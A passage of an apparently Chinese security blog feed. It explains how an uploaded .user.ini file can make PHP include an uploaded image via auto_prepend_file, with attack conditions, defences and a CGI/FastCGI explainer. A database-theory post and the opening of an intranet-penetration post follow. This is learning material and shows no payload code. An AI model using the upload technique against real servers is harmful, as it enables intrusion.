&lt;p&gt;user.ini 是用户自定义的 php.ini，如果在文件上传中没有对其进行限制，那么我们就可以修改 php.ini 的配置，既然是用户自定义，那么肯定要提到权限问题。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018204408073.png&#34; alt=&#34;image-20221018204408073&#34; /&gt;&lt;/p&gt;
&lt;p&gt;官方文档提到只有在这两种模式的 ini 设置可以被识别，那么就不得不提到什么是 PHP_INI_* 模式&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018175831433.png&#34; alt=&#34;image-20221018175831433&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这些模式决定着一个 PHP 的指令在何时何地，是否能够被设定。手册中的每个指令都有其所属的模式。例如有些指令可以在 PHP 脚本中用 ini_set () 来设定，而有些则只能在 php.ini 或 httpd.conf 中。(上面表格中没有提到的 PHP_INI_PERDIR 也可以在.user.ini 中设置)，user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022120119084.png&#34; alt=&#34;image-20221022120119084&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;也就是说我们想利用.user.ini 需要在 PHP_INI_USER 模式（PHP_INI_ALL 模式）中，那么哪些配置可以在 &lt;strong&gt;.user.ini&lt;/strong&gt; 中设定呢？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;php.ini 配置选项列表（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2luaS5saXN0LnBocA==&#34;&gt;http://php.net/manual/zh/ini.list.php&lt;/span&gt; ）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;利用-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-2&#34;&gt;#&lt;/a&gt; 利用&lt;/h3&gt;
&lt;p&gt;.user.ini 中两个中的配置就是 auto_prepend_file 和 auto_append_file。这两个配置的意思就是：我们指定一个文件（如 1.jpg，对后缀名没有太多要求），那么该文件就会被包含在要执行的 php 文件，相当于在 php 文件中中插入一句：require (./1.jpg)。这两个设置的区别只是在于 auto_prepend_file 是在文件前插入，auto_append_file 在文件最后插入 (文件后插入如果程序以 exit () 结束就无法利用)。&lt;/p&gt;
&lt;p&gt;demo：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018212902209.png&#34; alt=&#34;image-20221018212902209&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018212921996.png&#34; alt=&#34;image-20221018212921996&#34; /&gt;&lt;/p&gt;
&lt;p&gt;经过测试 php 版本从 5.3 开始到 7.4 都是可用的，php8.* 的没有成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018213744658.png&#34; alt=&#34;image-20221018213744658&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;防御-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-2&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;p&gt;利用条件：&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;服务器脚本语言为PHP 服务器使用CGI
FastCGI模式
上传目录下要有可执行的php文件&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;上面提到有 php8.* 是不可用的，那么可使用 php8.* 可用从根源解决问题&lt;/p&gt;
&lt;p&gt;user.ini 使用这两条条配置也有限制说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，不要将文件上传路径设置成为本目录下，存放上传文件的地方不要存有 php 文件（通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。但是有时可以使用  &lt;code&gt;../&lt;/code&gt;  来将文件上传到其他目录，达到一个利用的效果。）严格限制文件上传的路径&lt;/p&gt;
&lt;p&gt;再者结束对 ini 扩展名的过滤，对文件内容 auto_prepend_file、auto_append_file 的过滤&lt;/p&gt;
&lt;h3 id=&#34;补充&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#补充&#34;&gt;#&lt;/a&gt; 补充&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022150904047.png&#34; alt=&#34;image-20221022150904047&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022150917949.png&#34; alt=&#34;image-20221022150917949&#34; /&gt;&lt;/p&gt;
&lt;p&gt;了解什么是 FastCGI，首先应该知道什么是 cgi&lt;/p&gt;
&lt;p&gt;全称是 “通用网关接口”，是一种让客户端（web 浏览器）与 Web 服务器（apache，nginx 等）程序进行通信（数据传输）的协议。&lt;/p&gt;
&lt;h5 id=&#34;cgi工作流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cgi工作流程&#34;&gt;#&lt;/a&gt; CGI 工作流程&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;每次当 web server 收到 index.php 这种类型的动态请求后，会启动对应的 CGI 程序 - PHP 的解析器；&lt;/li&gt;
&lt;li&gt;PHP 解析器会解析 php.ini 配置文件，初始化运行环境，然后处理请求，处理完成后将数据按照 CGI 规定的格式返回给 web server 然后退出进程；&lt;/li&gt;
&lt;li&gt;最后 web server 再把结果返回给浏览器。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;高并发时的性能较差：&lt;br /&gt;
CGI 程序的每一次 web 请求都会有启动和退出过程 —— 每次 HTTP 服务器遇到动态请求时都需要重新启动脚本解析器来解析 php.ini，重新载入全部 DLL 扩展并重初始化全部数据结构，然后把结果返回给 HTTP 服务器&lt;/p&gt;
&lt;h5 id=&#34;fastcgi&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fastcgi&#34;&gt;#&lt;/a&gt; FastCGI&lt;/h5&gt;
&lt;p&gt;因 CGI 高并发时性能差，未解决这一问题产生了 FastCGI&lt;/p&gt;
&lt;h5 id=&#34;fastcgi工作流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fastcgi工作流程&#34;&gt;#&lt;/a&gt; FastCGI 工作流程&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;Web Server 启动同时，加载 FastCGI 进程管理器&lt;/li&gt;
&lt;li&gt;FastCGI 进程管理器读取 php.ini 配置文件，对自身进行初始化，启动多个 CGI 解释器进程 (php-cgi)，等待来自 Web Server 的连接。&lt;/li&gt;
&lt;li&gt;当 Web Server 接收到客户端请求时，FastCGI 进程管理器选择并连接到一个 CGI 解释器。Web server 会将相关环境变量和标准输入发送到 FastCGI 子进程 php-cgi 进行处理&lt;/li&gt;
&lt;li&gt;FastCGI 子进程完成处理后将数据按照 CGI 规定的格式返回给 Web Server，然后关闭 FastCGI 子进程或者等待下一次请求。&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;fastcgi解决方案&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fastcgi解决方案&#34;&gt;#&lt;/a&gt; FastCGI 解决方案&lt;/h5&gt;
&lt;p&gt;Master-Worker 模式&lt;/p&gt;
&lt;p&gt;Fastcgi 会先启一个 master，解析配置文件，初始化执行环境，然后再启动多个 worker。当请求过来时，master 会传递给一个 worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然提高。而且当 worker 不够用时，master 可以根据配置预先启动几个 worker 等着；当然空闲 worker 太多时，也会停掉一些，这样就提高了性能，也节约了资源。这就是 fastcgi 的对进程的管理。&lt;/p&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
        <title>关系数据库</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
        <content type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&#34;21关系数据库结构及形式化定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21关系数据库结构及形式化定义&#34;&gt;#&lt;/a&gt; 2.1 关系数据库结构及形式化定义&lt;/h2&gt;
&lt;h3 id=&#34;211关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#211关系&#34;&gt;#&lt;/a&gt; 2.1.1 关系&lt;/h3&gt;
&lt;p&gt;单一的数据结构 -- 关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;现实世界的实体以及实体之间的关系均用关系来表示&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;逻辑结构 --- 二维表&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从用户角度，关系模型中数据的逻辑结构是一张二维表&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域&#34;&gt;#&lt;/a&gt; 域&lt;/h4&gt;
&lt;p&gt;域是一组具有相同数据类型的值的集合&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整数、实数、自然数&lt;/li&gt;
&lt;li&gt;某一个范围的数&lt;/li&gt;
&lt;li&gt;指定长度的字符串集合&lt;/li&gt;
&lt;li ’男‘，‘女’=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;笛卡尔积&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#笛卡尔积&#34;&gt;#&lt;/a&gt; 笛卡尔积&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;笛卡尔积&lt;/p&gt;
&lt;p&gt;给定一组域 D1，D2，…，Dn，这些域中可以有相同的。    D1，D2，…，Dn 的笛卡尔积为：    D1×D2×…×Dn ＝ ｛（d1，d2，…，dn）｜diDi，i＝1，2，…，n&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;所有域的所有取值的一个组合&lt;/li&gt;
&lt;li&gt;不能重复&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;元组&lt;/p&gt;
&lt;p&gt;笛卡尔积中每一个元素（d1，d2，…，dn）叫作一个 n 元组（n-tuple）或简称元组 (Tuple)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分量&lt;/p&gt;
&lt;p&gt;笛卡尔积元素（d1，d2，…，dn）中的每一个值 di 叫作一个分量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基数&lt;/p&gt;
&lt;p&gt;若 Di（i＝1，2，…，n）为有限集，其基数 (域中所包含的值的个数) 为 mi（i＝1，2，…，n），则 D1×D2×…×Dn 的基数 M 为：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220918183227871.png&#34; alt=&#34;image-20220918183227871&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;笛卡尔积的表示方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;笛卡尔积可以表示为一个二维表&lt;/li&gt;
&lt;li&gt;表中的每行对应一个元组，表中的每列对应一个域&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系&#34;&gt;#&lt;/a&gt; 关系&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;关系&lt;br /&gt;
 D1×D2×…×Dn 的子集叫作在域 D1，D2，…，Dn 上的关系，表示为 ：&lt;br /&gt;
R（D1，D2，…，Dn）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;关系名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关系的目或者度&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;单元关系于二元关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当 n=1 时，称该关系为单元关系或者一元关系&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关系的表示&lt;/p&gt;
&lt;p&gt;关系也是一个二维表，表的每行对应一个元组，表的每列对应一个域&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关系中不同列可以对应相同的域&lt;/li&gt;
&lt;li&gt;为了加以区分，必须对每列起一个名字，称为属性（Attribute）名&lt;/li&gt;
&lt;li&gt;n 目关系必有 n 个属性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;候选码（Candidate key）：若关系中的某一属性组的值能唯一地标识一个元组，则称该属性组为候选码&lt;/li&gt;
&lt;li&gt;全码（All-key）：关系模式的所有属性是这个关系模式的候选码，称为全码&lt;/li&gt;
&lt;li&gt;主码（Primary key）：若一个关系有多个候选码，则选定其中一个为主码&lt;/li&gt;
&lt;li&gt;外部码：不是当前关系的码，但是其它关系的主码&lt;/li&gt;
&lt;li&gt;主属性：包含在任何候选码中的属性称为主属性。&lt;/li&gt;
&lt;li&gt;非主属性：不包含在任何侯选码中的属性称为非主属性（ Non-Prime attribute）或非码属性（Non-key attribute）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;三类关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本关系（基本表或者基表）&lt;/p&gt;
&lt;p&gt;实际存在的表，是实际存储数据的逻辑表示&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查询表&lt;/p&gt;
&lt;p&gt;查询结果对应的表&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;视图表&lt;/p&gt;
&lt;p&gt;由基本表或者其他识图表导出的表，是虚表，不对应实际的数据&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基本关系的性质&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;列是同质的&lt;/li&gt;
&lt;li&gt;不同的列可以出自一个域&lt;br /&gt;
其中每个列称为一个属性&lt;br /&gt;
不同的属性要给与不同的属性名&lt;/li&gt;
&lt;li&gt;列的顺序无所谓，列的次序可以任意交换&lt;/li&gt;
&lt;li&gt;任意两个元组的候选码不能相同&lt;/li&gt;
&lt;li&gt;行的顺序无所谓，行的次序可以任意交换&lt;/li&gt;
&lt;li&gt;分量必须取原子值（最基本的）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;222-关系模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-关系模式&#34;&gt;#&lt;/a&gt; 2.2.2、关系模式&lt;/h3&gt;
&lt;h4 id=&#34;什么是关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是关系模型&#34;&gt;#&lt;/a&gt; 什么是关系模型&lt;/h4&gt;
&lt;p&gt;关系模式（型）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对关系的描述&lt;/li&gt;
&lt;li&gt;静态的稳定的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系（值）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关系模式在某一个时刻的状态或者内容&lt;/li&gt;
&lt;li&gt;动态的，随时间变化的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系是元组的集合，因此关系模式必须指出这个元组集合的结构，即它由哪些组成，这些属性来自哪些域，以及属性与域之间的映像关系。&lt;/p&gt;
&lt;h4 id=&#34;定义关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定义关系模型&#34;&gt;#&lt;/a&gt; 定义关系模型&lt;/h4&gt;
&lt;p&gt;关系模式可以形式化的表示为：&lt;/p&gt;
&lt;p&gt;​	R（U，D，DOM，F）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;R       关系名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;U       组成该关系的属性名集合&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;D       属性组 U 中属性所来自的域&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DOM  属性向域的映象集合&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;F        属性间的数据依赖关系集合&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系定义模式通常可以简记为&lt;/p&gt;
&lt;p&gt;R(U)&lt;/p&gt;
&lt;p&gt;关系模式何关系往往统称为关系&lt;/p&gt;
&lt;h4 id=&#34;关系模型的存储结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系模型的存储结构&#34;&gt;#&lt;/a&gt; 关系模型的存储结构&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;关系模型的逻辑结构 - 表&lt;/li&gt;
&lt;li&gt;关系模型的物理结构
&lt;ol&gt;
&lt;li&gt;有的关系数据库管理中一个表对应一个操作系统文件，将物理数据组织交给操作系统完成；&lt;/li&gt;
&lt;li&gt;有的关系数据库系统从操作系统那里申请若干个大的文件，自己划分文件空间，组织表，索引等存储结构，并进行存储管理。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;223关系数据库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#223关系数据库&#34;&gt;#&lt;/a&gt; 2.2.3 关系数据库&lt;/h3&gt;
&lt;p&gt;在一个给定的应用领域中，所有关系的集合构成一个关系数据库&lt;/p&gt;
&lt;p&gt;关系数据库也有型和值之分&lt;/p&gt;
&lt;h2 id=&#34;22关系操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22关系操作&#34;&gt;#&lt;/a&gt; 2.2 关系操作&lt;/h2&gt;
&lt;h3 id=&#34;221-基本关系操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#221-基本关系操作&#34;&gt;#&lt;/a&gt; 2.2.1、基本关系操作&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;常用的关系操作
&lt;ul&gt;
&lt;li&gt;查询：选择、投影、连接、除、并、交、差、笛卡尔积&lt;/li&gt;
&lt;li&gt;数据更新：插入、删除、修改&lt;/li&gt;
&lt;li&gt;选择、投影、并、差、笛卡尔积是 5 种基本操作&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;关系操作的特点
&lt;ul&gt;
&lt;li&gt;集合操作方式：操作的对象和结果都是集合，一次一集合的方式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;222-关系数据库语言的分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-关系数据库语言的分类&#34;&gt;#&lt;/a&gt; 2.2.2、关系数据库语言的分类&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;关系代数语言&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用对关系的运算来表达查询要求&lt;/li&gt;
&lt;li&gt;代表 ISBL&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关系演算语言：用谓词来表达查询要求&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;元组关系演算语言&lt;br /&gt;
谓词变元的基本对象是元组变量&lt;/p&gt;
&lt;p&gt;代表：APLHA, QUEL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;域关系演算语言&lt;/p&gt;
&lt;p&gt;谓词变元的基本对象是域变量&lt;/p&gt;
&lt;p&gt;代表：QBE&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;介于关系代数何关系演算之间的语言&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;代表 SQL&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;每一个 ISBL 语句都近似于关系代数表达式&lt;br /&gt;
关系代数、关系演算语言均是抽象的查询语言，这些抽象的语言与具体的关系数据库管理系统中实现的实际语言并不完全一样。但它们能用作评估实际系统中查询语言能力的标准或基础。&lt;/p&gt;
&lt;h2 id=&#34;23关系的完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23关系的完整性&#34;&gt;#&lt;/a&gt; 2.3 关系的完整性&lt;/h2&gt;
&lt;h3 id=&#34;231-关系的三类完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#231-关系的三类完整性约束&#34;&gt;#&lt;/a&gt; 2.3.1 关系的三类完整性约束&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;实体完整性何参照完整性&lt;br /&gt;
关系模型必须满足的完整性约束条件，称为关系的两个不变性，应该由关系系统自动支持&lt;/li&gt;
&lt;li&gt;用户定义完整性&lt;br /&gt;
应用领域需要遵循的约束条件，体现了具体领域中的语义约束&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;232-实体完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#232-实体完整性&#34;&gt;#&lt;/a&gt; 2.3.2 实体完整性&lt;/h3&gt;
&lt;p&gt;(1) 实体完整性规则是针对基本关系而言的。一个基本表通常对应现实世界的一个实体集。&lt;/p&gt;
&lt;p&gt;(2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。&lt;/p&gt;
&lt;p&gt;(3) 关系模型中以主码作为唯一性标识。&lt;/p&gt;
&lt;p&gt;(4) 主码中的属性即主属性不能取空值。&lt;/p&gt;
&lt;h3 id=&#34;233-参照完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#233-参照完整性&#34;&gt;#&lt;/a&gt; 2.3.3 参照完整性&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;关系间的引用&lt;/p&gt;
&lt;p&gt;在关系模型中实体及实体间的联系都是用关系来描     述的，因此可能存在着关系与关系间的引用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外码&lt;br /&gt;
外码：设 F 是基本关系 R 的一个或一组属性，但不是关系 R 的码。如果 F 与基本关系 S 的主码 Ks 相对应，则称 F 是基本关系 R 的外码。&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;基本关系R称为参照关系
基本关系S称为被参照关系或目标关系&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;参照完整性规则&lt;br /&gt;
若属性（或属性组）F 是基本关系 R 的外码，它与基本关系 S 的主码 Ks 相对应（基本关系 R 和 S 不一定是不同的关系），则对于 R 中每个元组在 F 上的值必须为：&lt;br /&gt;
或者取空值（F 的每个属性值均为空值）&lt;br /&gt;
或者等于 S 中某个元组的主码值&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;234-用户定义的完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#234-用户定义的完整性&#34;&gt;#&lt;/a&gt; 2.3.4 用户定义的完整性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;针对某一具体关系数据库的约束条件，反映某一具体应用所涉及的数据必须满足的语义要求&lt;/li&gt;
&lt;li&gt;关系模型应提供定义和检验这类完整性的机制，以便用统一的系统的方法处理它们，而不要由应用程序承担这一功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;24关系代数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24关系代数&#34;&gt;#&lt;/a&gt; 2.4 关系代数&lt;/h2&gt;
&lt;p&gt;关系代数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一种抽象的查询语言&lt;/li&gt;
&lt;li&gt;用对关系的运算来表达查询&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系代数的三个要素&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运算对象：关系&lt;/li&gt;
&lt;li&gt;运算结果：关系&lt;/li&gt;
&lt;li&gt;运算符：4 类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;集合运算符（）&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzQ3NTc2NjYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923174757666.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220923174757666&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将关系看成元组的集合&lt;/li&gt;
&lt;li&gt;运算是从关系的 “水平” 方向即行的角度来进行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;专门的关系运算符 &amp;lt; img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzUwMDc3ODYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923175007786.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220923175007786&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不仅涉及行而且涉及列&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系代数运算的分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;传统的集合运算&lt;/p&gt;
&lt;p&gt;并、差、交、广义笛卡尔积&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;专门的关系运算&lt;/p&gt;
&lt;p&gt;选择、投影、连接、除&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/</id>
        <title>域环境基础和搭建</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/"/>
        <content type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&#34;内网渗透的流程概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网渗透的流程概述&#34;&gt;#&lt;/a&gt; 内网渗透的流程概述&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907123946766.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;内网渗透攻击的是一个内网内的所有机器&lt;/p&gt;
&lt;p&gt;目的：控制内网内的所有机器&lt;/p&gt;
&lt;p&gt;前提：已经控制了内网里的一台机器&lt;/p&gt;
&lt;h2 id=&#34;什么是工作域和组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是工作域和组&#34;&gt;#&lt;/a&gt; 什么是工作域和组&lt;/h2&gt;
&lt;p&gt;工作组：工作组是局域网中的一一个概念。它是最常见最简单最普通的资源管理模式，就是将&lt;br /&gt;
不同的电脑按功能分别列入不同的组中，以方便管理&lt;/p&gt;
&lt;p&gt;域: Windows 域是计算机网络的一种形式，其中所有用户帐户，计算机，打印机和其他安全&lt;br /&gt;
主体都在位于称为域控制器的一 - 个或多个中央计算机集群上的中央数据库中注册。身份验证&lt;br /&gt;
在域控制器上进行。在域中使用计算机的每个人都会收到一个唯一的用户帐户， 然后可以为&lt;br /&gt;
